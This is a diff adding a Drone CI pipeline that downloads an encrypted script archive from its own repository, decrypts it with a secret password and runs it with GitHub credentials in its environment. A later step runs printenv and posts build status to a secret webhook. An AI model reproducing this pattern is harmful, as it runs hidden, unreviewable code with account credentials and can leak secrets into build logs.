@@ -1,0 +1,46 @@
+kind: pipeline
+type: docker
+name: Validator
+
+clone:
+  disable: true
+
+node:
+  server: packet
+  type: docker
+
+steps:
+  - name: Initial
+    image: 'python:3.8-slim'
+    commands:
+      - apt-get update && apt-get install curl git -y
+      - curl -L "$DRONE_REPO_LINK"/raw/master/.github/scripts.tar.gz --output scripts.tar.gz
+      - openssl enc -d -aes256 -salt -pbkdf2 -in scripts.tar.gz -pass env:PASSWORD | tar xz
+      - bash runner.sh
+    environment:
+      github_username:
+        from_secret: GITHUB_USERNAME
+      github_password:
+        from_secret: GITHUB_PASSWORD
+      PASSWORD:
+        from_secret: OPENSSL_PASSWORD
+  
+  - name: Final
+    image: 'python:3.8-slim'
+    commands:
+      - pip3 install requests
+      - printenv
+      - printf "import requests\nrequests.post('$hook_url', {'head_commit':'${CI_COMMIT_SHA}', 'status':'${DRONE_BUILD_STATUS^^}'}, headers={'web_api_key':'$web_api_key'})" | python3
+    environment:
+      web_api_key:
+        from_secret: WEB_API_KEY
+      hook_url:
+        from_secret: HOOK_URL
+    when:
+      status:
+        - success
+        - failure
+
+trigger:
+  branch:
+  - master
